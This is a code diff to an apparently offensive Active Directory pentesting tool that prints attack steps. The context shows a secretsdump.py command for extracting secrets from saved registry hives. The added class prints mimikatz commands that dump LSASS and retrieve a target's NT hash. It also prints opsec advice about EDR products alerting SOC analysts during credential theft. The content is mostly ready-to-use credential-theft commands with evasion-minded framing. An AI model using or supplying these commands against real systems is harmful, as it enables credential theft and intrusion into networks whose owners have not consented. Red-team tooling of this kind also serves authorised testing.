@@ -1012,3 +1012,23 @@ class x_CanRDP_SeBackupPrivilege_LATFP_or_RDP_required(Action):
         comment = "Extract secrets"
         cmd = "secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save local"
         print_line(comment, cmd, v)
+
+
+class x_LSASS_dumper(Action):
+    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
+        v = vars(glob, parent, target)
+
+        comment = [
+            'An EDR product may detect your attempt to inject into lsass',
+            'and alert a SOC analyst. There are many more opsec considerations to',
+            'keep in mind when stealing credentials or tokens.',
+        ]
+        print_comment(comment)
+
+        comment = 'Dump LSASS on {parent} and retrieve the NT hash of {target}'
+        cmd = [
+            'mimikatz.exe',
+            'privilege::debug',
+            'sekurlsa::logonpasswords',
+        ]
+        print_line(comment, cmd, v)
